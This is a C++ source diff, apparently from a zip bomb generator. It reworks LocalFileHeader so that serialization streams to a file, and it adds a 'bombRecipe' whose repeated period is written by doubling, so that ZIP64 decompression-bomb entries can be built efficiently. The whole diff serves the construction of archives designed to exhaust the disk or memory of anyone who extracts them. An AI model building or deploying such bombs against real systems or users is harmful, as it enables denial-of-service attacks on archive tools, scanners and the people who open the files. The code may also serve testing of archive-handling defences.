@@ -2,11 +2,31 @@
 // Created by LeeEeZian on 9/9/2026.
 //
 #include "zip_file_construction/LocalFileHeader.h"
+
+#include <iostream>
+
 #include "factory/PayloadFactory.h"
 #include "Helper.h"
 #include "deflation/BitWriter.h"
 #include "zip_file_construction/Zip64.h"
 #include <span>
+
+#include "Timer.h"
+
+namespace {
+    void repeatInPlace(std::vector<uint8_t> &vector, const size_t n) {
+        if (n <= 1) return;
+        const size_t originalSize{vector.size()};
+        vector.resize(vector.size() * n);
+
+        size_t newSize{originalSize};
+        while (newSize < vector.size()) {
+            std::copy_n(vector.begin(), originalSize, vector.begin() + static_cast<long long>(newSize));
+            newSize += originalSize;
+        }
+    }
+}
+
 
 LocalFileHeader::LocalFileHeader(const FileHeaderConstructConfig &config) : version_{config.version},
                                                                             flags_{config.flags},
@@ -19,7 +39,7 @@ LocalFileHeader::LocalFileHeader(const FileHeaderConstructConfig &config) : vers
                                                                             uncompressedSize_{config.uncompressedSize},
                                                                             fileName_{config.fileName},
                                                                             extraField_{config.extraField},
-                                                                            data_{config.data} {
+                                                                            bombRecipe_{config.bombRecipe} {
     if (config.crc32.has_value()) {
         crc32_ = config.crc32.value();
     } else {
@@ -32,8 +52,9 @@ LocalFileHeader::LocalFileHeader(const FileHeaderConstructConfig &config) : vers
     }
 }
 
-std::vector<uint8_t> LocalFileHeader::serialize() {
+size_t LocalFileHeader::serializeTo(std::ofstream &out) {
     using namespace helper;
+    size_t size{};
 
     std::vector<uint8_t> serialized;
     appendBytes32Small(serialized, signature);
@@ -69,9 +90,41 @@ std::vector<uint8_t> LocalFileHeader::serialize() {
         serialized.insert(serialized.end(), serializedExtraField.begin(), serializedExtraField.end());
     }
 
-    serialized.insert(serialized.end(), data_.begin(), data_.end());
+    size+= serialized.size();
 
-    return serialized;
+    writeFile(out, serialized);
+
+
+    if (!bombRecipe_.has_value()) {
+        const auto start{std::chrono::steady_clock::now()};
+
+        Timer lfhWrite{"Writing lfh data"};
+        writeFile(out, data_);
+    }
+
+    if (bombRecipe_.has_value()) {
+        Timer lfhWrite{"Writing lfh bomb data"};
+
+        size+=bombRecipe_->start.size();
+        writeFile(out, bombRecipe_->start);
+
+        size_t periodSize{bombRecipe_->period.size()};
+        while (bombRecipe_->numberOfPeriods) {
+            if (bombRecipe_->numberOfPeriods & 1) {
+                size+=periodSize;
+                writeFile(out, bombRecipe_->period);
+            }
+
+            bombRecipe_->numberOfPeriods >>= 1;
+            periodSize*=2;
+            repeatInPlace(bombRecipe_->period, 2);
+        }
+        size+=bombRecipe_->end.size();
+
+        writeFile(out, bombRecipe_->end);
+    }
+
+    return size;
 }
 
 LocalFileHeader LocalFileHeader::createStored(std::string fileName, std::string data) {
@@ -93,9 +146,11 @@ LocalFileHeader LocalFileHeader::createStored(std::string fileName, std::string 
 }
 
 LocalFileHeader LocalFileHeader::createBomb(std::string fileName, const size_t size) {
-    auto [data, uncompressedSize, crc32]{payloadFactory::createFixedBombPayload(size)};
+    auto [recipe,uncompressedSize,compressedSize,crc32]{payloadFactory::createFixedBombPayload(size)};
     FileHeaderConstructConfig config{};
-    if (uncompressedSize >= 0xFFFFFFFFULL || data.size() >= 0xFFFFFFFFULL) {
+
+
+    if (uncompressedSize >= 0xFFFFFFFFULL || compressedSize >= 0xFFFFFFFFULL) {
         config.version = static_cast<uint16_t>(Version::ZIP64);
     } else {
         config.version = static_cast<uint16_t>(Version::DEFLATE);
@@ -105,12 +160,14 @@ LocalFileHeader LocalFileHeader::createBomb(std::string fileName, const size_t s
     config.modTime = 0;
     config.modDate = 0;
 
-    config.compressedSize = data.size();
+    config.compressedSize = compressedSize;
     config.uncompressedSize = uncompressedSize;
     config.fileName.assign(fileName.begin(), fileName.end());
     config.extraField = {};
 
-    config.data = std::move(data);
     config.crc32 = crc32;
+    config.bombRecipe = recipe;
+
+
     return LocalFileHeader{config};
 }
